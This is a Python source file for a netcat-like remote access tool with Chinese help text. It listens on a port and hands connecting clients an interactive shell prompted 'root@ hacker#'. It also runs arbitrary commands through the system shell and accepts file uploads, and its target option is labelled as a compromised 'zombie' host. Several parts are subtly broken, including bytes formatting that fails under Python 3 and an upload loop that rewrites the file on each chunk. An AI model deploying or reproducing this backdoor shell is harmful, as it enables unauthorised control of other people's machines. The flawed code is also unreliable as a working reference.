#!/usr/bin/env python
# coding=utf-8
'''
    简易工具
    By Justin Seitz
    Modified By LiT0
'''


import sys
from concurrent.futures import ThreadPoolExecutor
from socket import socket,AF_INET,SOCK_STREAM
import subprocess
import argparse

def main():

    if not args.listen and args.target is not None and args.port > 0:
        buffer = sys.stdin.read()
        client_sender(buffer)

    if args.listen:
        server_forver()

def client_sender(buffer):
    client = socket(AF_INET,SOCK_STREAM)

    try:
        client.connect((args.target,args.port))
        print('connected')

        while True:
            recv_len = 1
            response = b''

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break

            print(response.decode('utf-8'),end='')
            buffer = input('')
            buffer += '\n'

            client.send(buffer.encode('ascii'))

    except Exception as e:
        print(e)

    client.close()

def server_forver():

    if args.target is None:
        target = '0.0.0.0'
    else:
        target = args.target

    server = socket(AF_INET,SOCK_STREAM)
    server.bind((target,args.port))

    server.listen(5)
    
    pool = ThreadPoolExecutor(5)

    while True:
        client_socket,addr = server.accept()
        pool.submit(client_hander,client_socket)

def client_hander(client_socket):
    if args.upload:
        file_buffer = b''
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

            try:
                with open(args.upload,'wb') as f:
                    f.write(file_buffer)

                client_socket.send(b"Successfully saved file to {} \r\n".format(args.upload))
            except:
                client_socket.send(b"Failed to save file to {}\r\n".format(args.upload))

    if args.exe:
        output = run_command(args.exe)
        client_socket.send(output)

    if args.command:
        while True:
            client_socket.send(b"root@ hacker# ")
            cmd_buffer = b''
            cmd_buffer += client_socket.recv(1024)
            cmd_buffer = cmd_buffer.decode('ascii').strip('\n')
            response = run_command(cmd_buffer)
            client_socket.send(response)

def run_command(command):
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output = "Failed to execute command.\r\n"

    return output

if __name__=='__main__':
    parse = argparse.ArgumentParser(description='NetCat Like Tools')
    parse.add_argument('-l','--listen',dest='listen',action='store_true',help='开始监听[host][port]')
    parse.add_argument('-e','--execute=',dest='exe',type=str,help='执行命令')
    parse.add_argument('-u','--upload=',dest='upload',type=str,help='上传路径')
    parse.add_argument('-c','--commandshell',dest='command',action='store_true',help='开启cmdshell')
    parse.add_argument('-t','--target=',dest='target',type=str,help='目标肉鸡')
    parse.add_argument('-p','--port',dest='port',type=int,required=True,help='端口号')
    args = parse.parse_args()
    main()
